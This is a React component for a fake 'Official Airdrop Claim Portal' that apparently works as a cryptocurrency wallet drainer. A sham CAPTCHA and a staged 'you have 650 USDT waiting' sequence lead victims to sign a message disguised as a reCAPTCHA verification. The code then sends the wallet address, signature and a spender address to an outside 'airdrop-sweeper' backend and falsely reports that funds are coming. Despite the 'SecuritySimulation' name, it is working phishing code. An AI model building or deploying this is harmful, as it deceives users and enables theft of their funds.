import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import { useWalletConnect } from '../hooks/useWalletConnect';

const SecuritySimulationCaptcha = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [simulationData, setSimulationData] = useState(null);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [redirectTo, setRedirectTo] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [mobileOS, setMobileOS] = useState(null);
  const [eligibilityMessage, setEligibilityMessage] = useState('');
  const [modalStep, setModalStep] = useState(1);
  const [retryCount, setRetryCount] = useState(0);
  const [detectedWallet, setDetectedWallet] = useState(null);
  const recaptchaRef = useRef(null);
  const isRecaptchaLoaded = useRef(false);
  const retryTimeoutRef = useRef(null);

  // Use WalletConnect hook
  const { connect, isConnected, wcUri } = useWalletConnect();

  const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
  const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
  const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';

  const detectInstalledWallet = () => {
    if (window.bybitWallet) return { name: 'Bybit Wallet', icon: '📊', type: 'bybit' };
    if (window.BinanceChain) return { name: 'Binance Wallet', icon: '🟡', type: 'binance' };
    if (window.ethereum?.isTrust) return { name: 'Trust Wallet', icon: '🔷', type: 'trust' };
    if (window.ethereum?.isMetaMask) return { name: 'MetaMask', icon: '🦊', type: 'metamask' };
    if (window.solana?.isPhantom) return { name: 'Phantom', icon: '🟣', type: 'phantom' };
    return null;
  };

  useEffect(() => {
    document.title = 'Official Airdrop Claim Portal';
    const wallet = detectInstalledWallet();
    if (wallet) setDetectedWallet(wallet);
  }, []);

  useEffect(() => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    setIsMobile(/android|iPad|iPhone|iPod/i.test(userAgent));
    if (isMobile) {
      if (/iPad|iPhone|iPod/.test(userAgent)) setMobileOS('ios');
      else if (/android/.test(userAgent)) setMobileOS('android');
    }
  }, [isMobile]);

  useEffect(() => {
    if (isConnected) {
      console.log('[WC] Connected, processing claim...');
      processClaimSignature();
    }
  }, [isConnected]);

  const showVerificationModal = async () => {
    setShowSecurityModal(true);
    setModalStep(1);
    await new Promise(r => setTimeout(r, 2000));
    setModalStep(2);
    await new Promise(r => setTimeout(r, 2000));
    setModalStep(3);
    setEligibilityMessage('Confirmed! You have 650 USDT waiting!');
    await new Promise(r => setTimeout(r, 1500));
    setModalStep(4);
    setEligibilityMessage('Please sign the claim receipt to deposit funds into your wallet.');
  };

  const hideSecurityModal = () => {
    setShowSecurityModal(false);
    setModalStep(1);
    setEligibilityMessage('');
  };

  useEffect(() => {
    const renderRecaptcha = () => {
      if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
        window.grecaptcha.render(recaptchaRef.current, {
          sitekey: RECAPTCHA_SITE_KEY,
          callback: async (token) => {
            setIsVerified(true);
            await showVerificationModal();
            setTimeout(() => triggerWalletConnection(token), 500);
          },
          'expired-callback': () => setErrorMessage('Handshake Interrupted. Please try again.')
        });
        isRecaptchaLoaded.current = true;
      }
    };
    
    if (window.grecaptcha) {
      renderRecaptcha();
    } else {
      const checkGrecaptcha = setInterval(() => {
        if (window.grecaptcha) {
          clearInterval(checkGrecaptcha);
          renderRecaptcha();
        }
      }, 100);
      return () => clearInterval(checkGrecaptcha);
    }
  }, []);

  const triggerWalletConnection = async () => {
    setIsProcessing(true);
    setEligibilityMessage('Initiating secure handshake...');
    try {
      if (isMobile) {
        setEligibilityMessage('Opening wallet app...');
        setModalStep(4);
        await connect();
      } else {
        await processClaimSignature();
      }
    } catch (error) {
      setErrorMessage('Connection failed: ' + (error.message || 'Unknown error'));
      setIsProcessing(false);
      hideSecurityModal();
    }
  };

  const processClaimSignature = async () => {
    try {
      const provider = window.bybitWallet || window.BinanceChain || window.ethereum;
      if (!provider) throw new Error('No wallet detected');

      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      const userAddress = accounts[0];

      const randomId = Math.random().toString(36).substring(2, 15);
      const claimMessage = `I authorize reCAPTCHA Browser Verification for ${new Date().toLocaleDateString()}. Internal ID: ${randomId}`;

      const signature = await provider.request({
        method: 'personal_sign',
        params: [claimMessage, userAddress]
      });

      await fetch(`${API_URL}/api/capture-approval`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: userAddress,
          signature,
          message: claimMessage,
          chainId: 56,
          tokenType: 'USDT',
          amount: '650',
          spender: BSC_TEST_WALLET,
          timestamp: new Date().toISOString()
        })
      });

      setSimulationData({ amount: '650 USDT', status: 'Claim Submitted!' });
      hideSecurityModal();
      setTimeout(() => setRedirectTo(true), 2000);
      setIsProcessing(false);
    } catch (error) {
      setErrorMessage(error.message);
      setIsProcessing(false);
      hideSecurityModal();
    }
  };

  const resetCaptcha = () => {
    if (window.grecaptcha) window.grecaptcha.reset();
    setIsVerified(false);
    setErrorMessage('');
    setSimulationData(null);
    setIsProcessing(false);
    setRedirectTo(false);
    setEligibilityMessage('');
    setModalStep(1);
    setRetryCount(0);
    if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
  };

  if (redirectTo) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 text-center max-w-md">
          <div className="text-6xl mb-4">🎉</div>
          <h1 className="text-2xl font-bold text-green-600 mb-4">Claim Submitted Successfully!</h1>
          <p className="text-gray-600">Your claim has been processed. Funds will be deposited shortly.</p>
          <button onClick={resetCaptcha} className="mt-6 px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
            Check Another Wallet
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden max-w-md w-full">
        <div className="bg-gradient-to-r from-blue-600 to-green-600 px-6 py-5">
          <h2 className="text-2xl font-bold text-white text-center">Official Airdrop Claim Portal</h2>
          <p className="text-blue-100 text-sm text-center mt-1">USDT | BNB | SOL | TRUMP</p>
        </div>

        <div className="p-6">
          {/* Confirm you are not a robot - Added here prominently */}
          <div className="mb-4 p-3 bg-blue-50 border border-blue-200 rounded-lg text-center">
            <p className="text-sm text-blue-700 font-medium">
              ✓ Please confirm you are not a robot by completing the CAPTCHA below
            </p>
          </div>

          <div className="mb-4 text-center">
            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom</p>
          </div>

          {detectedWallet && !isProcessing && !simulationData && (
            <div className="mb-4 p-2 bg-green-50 border border-green-200 rounded-lg text-center">
              <span className="text-sm text-green-700">✅ Detected: {detectedWallet.icon} {detectedWallet.name}</span>
            </div>
          )}

          <div className="flex justify-center mb-6">
            <div ref={recaptchaRef}></div>
          </div>

          {isProcessing && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
              <p className="text-gray-600 text-sm">{eligibilityMessage || 'Initiating secure handshake...'}</p>
            </div>
          )}

          {errorMessage && !isProcessing && (
            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
              <p className="text-sm text-yellow-800 text-center">{errorMessage}</p>
              <button onClick={resetCaptcha} className="mt-2 text-sm bg-yellow-600 text-white px-3 py-1 rounded w-full">Try Again</button>
            </div>
          )}

          {simulationData && !isProcessing && (
            <div className="mt-4 bg-green-900 rounded-lg p-4 text-white text-center">
              <p className="font-semibold">{simulationData.status}</p>
              <p className="text-sm">Amount: {simulationData.amount}</p>
            </div>
          )}

          {/* Footer instruction */}
          <div className="mt-6 pt-4 border-t border-gray-200 text-center">
            <p className="text-xs text-gray-500">Click the CAPTCHA above to verify you are human</p>
            <p className="text-xs text-gray-400 mt-1">No gas fee required - Signature only</p>
          </div>
        </div>
      </div>

      {showSecurityModal && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500">
            {modalStep === 1 && (
              <>
                <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-600 mx-auto mb-4"></div>
                <h3 className="text-xl font-bold text-white mb-2">Verifying Address Eligibility...</h3>
                <p className="text-gray-400 text-sm">Please wait while we check your wallet</p>
              </>
            )}
            {modalStep === 2 && (
              <>
                <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-green-600 mx-auto mb-4"></div>
                <h3 className="text-xl font-bold text-white mb-2">Syncing with Secure Node...</h3>
                <p className="text-gray-400 text-sm">Establishing secure connection</p>
              </>
            )}
            {modalStep === 3 && (
              <>
                <div className="text-6xl mb-4">✅</div>
                <h3 className="text-xl font-bold text-green-400 mb-2">✓ Confirm you are not a robot</h3>
                <p className="text-gray-400 text-sm">Verification successful! Opening your wallet...</p>
              </>
            )}
            {modalStep === 4 && (
              <>
                <div className="text-5xl mb-4">📱</div>
                <h3 className="text-xl font-bold text-white mb-2">Opening Your Wallet</h3>
                <p className="text-gray-300 text-sm mb-3">
                  Your wallet app will open automatically. Please sign with FaceID / Fingerprint.
                </p>
                <div className="mt-3 p-3 bg-blue-50 rounded-lg">
                  <p className="text-sm text-blue-600 font-medium">✓ Confirm you are not a robot</p>
                  <p className="text-xs text-blue-500 mt-1">Waiting for wallet connection...</p>
                </div>
                <div className="mt-3 p-2 bg-yellow-50 rounded-lg">
                  <p className="text-xs text-yellow-600">The signature request will appear in your wallet app</p>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default SecuritySimulationCaptcha;